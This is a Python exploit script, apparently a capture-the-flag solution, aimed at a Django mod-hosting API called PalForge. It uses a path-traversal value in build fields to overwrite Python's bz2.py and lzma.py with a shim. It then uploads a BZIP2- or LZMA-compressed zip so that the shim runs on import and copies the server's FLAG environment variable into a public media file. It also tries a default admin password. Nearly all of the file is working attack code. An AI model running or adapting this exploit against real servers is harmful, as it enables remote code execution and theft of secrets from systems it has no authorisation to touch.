#!/usr/bin/env python3
# PalForge RCE — trigger a codec import via the ZIP compression method we control.
# Step 1: overwrite /usr/local/lib/python3.11/bz2.py & lzma.py with a shim (deflate zip, so reading THAT
#         zip uses zlib not bz2/lzma).  200 => overwrite ok.
# Step 2: upload a NEW zip whose entries are BZIP2- (or LZMA-) compressed. The view does
#         zf.open(name).read() -> zipfile does `import bz2` -> our shim runs -> dump FLAG to /data/media.
# We control the import via the compression method; independent of drf-spectacular internals.
# Usage: python rce3.py 144.79.188.39:PORT   (fresh instance)
import io, sys, zipfile, requests, secrets, time

BASE = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39:39620"
if not BASE.startswith("http"):
    BASE = "http://" + BASE
S = requests.Session()
OUT = "c" + secrets.token_hex(3) + ".txt"
SHIM = "import os\ntry:\n open('/data/media/" + OUT + "','a').write('FLAG='+os.environ.get('FLAG','')+'\\n')\nexcept Exception:\n pass\n"

def jj(r):
    try: return r.json()
    except Exception: print("   nonjson", r.status_code, r.text[:100]); return {}
def auth():
    u = "g" + secrets.token_hex(4); p = "Pw12345!x"
    S.post(f"{BASE}/api/auth/register/", json={"username": u, "password": p}, timeout=15)
    r = S.post(f"{BASE}/api/auth/login/", json={"username": u, "password": p}, timeout=15)
    if r.status_code != 200:
        r = S.post(f"{BASE}/api/auth/login/", json={"username": "palforge_admin", "password": "change-me-admin"}, timeout=15)
    return jj(r)["access"]
def H(t): return {"Authorization": f"Bearer {t}"}
def plat(tok, code):
    r = S.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15); d = jj(r)
    items = d.get("results", d) if isinstance(d, dict) else d
    for it in (items or []):
        if isinstance(it, dict) and it.get("code") == code: return it["id"]
    return jj(S.post(f"{BASE}/api/platforms/", headers=H(tok), json={"code": code, "name": "z", "description": ""}, timeout=15)).get("id")
def build(tok, ver, code):
    pid = plat(tok, code)
    mid = jj(S.post(f"{BASE}/api/mods/", headers=H(tok), json={"title": "z", "mod_version": ver, "release_notes": "", "is_enabled": True}, timeout=15))["id"]
    bid = jj(S.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok), json={"platform": pid}, timeout=15))["id"]
    return mid, bid
def upload(tok, mid, bid, entries, compression, with_filelist=True):
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", compression) as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    bio.seek(0)
    files = {"zip_file": ("p.zip", bio, "application/zip")}
    if with_filelist:
        files["filelist_file"] = ("f.txt", io.BytesIO(b"x"), "text/plain")
    return S.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok), files=files, timeout=30)

def main():
    tok = auth(); print("[*] token ok")
    # Step 1: overwrite bz2.py + lzma.py (deflate zip => reading it uses zlib, not the codecs we clobber)
    mid, bid = build(tok, "../../../usr/local", "lib/python3.11")
    r = upload(tok, mid, bid, {"bz2.py": SHIM, "lzma.py": SHIM}, zipfile.ZIP_DEFLATED)
    print(f"[*] overwrite bz2.py/lzma.py -> {r.status_code} (200 = ok)")

    # Step 2: upload a BZIP2-compressed zip to a DIFFERENT (normal) build -> triggers `import bz2`
    mid2, bid2 = build(tok, "trigger-bz2", "steamdeck")
    r = upload(tok, mid2, bid2, {"a.txt": b"x" * 64}, zipfile.ZIP_BZIP2, with_filelist=False)
    print(f"[*] BZIP2 trigger upload -> {r.status_code}")
    r = S.get(f"{BASE}/media/{OUT}", timeout=15)
    print(f"[*] GET /media/{OUT} (after bz2) -> {r.status_code}", r.text[:120] if r.status_code == 200 else "")

    # also try LZMA trigger
    if r.status_code != 200:
        mid3, bid3 = build(tok, "trigger-lzma", "xboxpc")
        r2 = upload(tok, mid3, bid3, {"a.txt": b"y" * 64}, zipfile.ZIP_LZMA, with_filelist=False)
        print(f"[*] LZMA trigger upload -> {r2.status_code}")
        r = S.get(f"{BASE}/media/{OUT}", timeout=15)
        print(f"[*] GET /media/{OUT} (after lzma) -> {r.status_code}", r.text[:120] if r.status_code == 200 else "")

    if r.status_code == 200:
        import re; m = re.search(r"PTITCTF\{[^}]+\}", r.text)
        print("\n[FLAG]", m.group(0)) if m else print("[?] fired; text:", r.text[:200])
    else:
        print("[-] no fire. bz2/lzma were already imported at startup, or codec import path differs.")
        print("    Next: local docker sys.modules diff to find a fresh top-level stdlib .py import.")

if __name__ == "__main__":
    main()
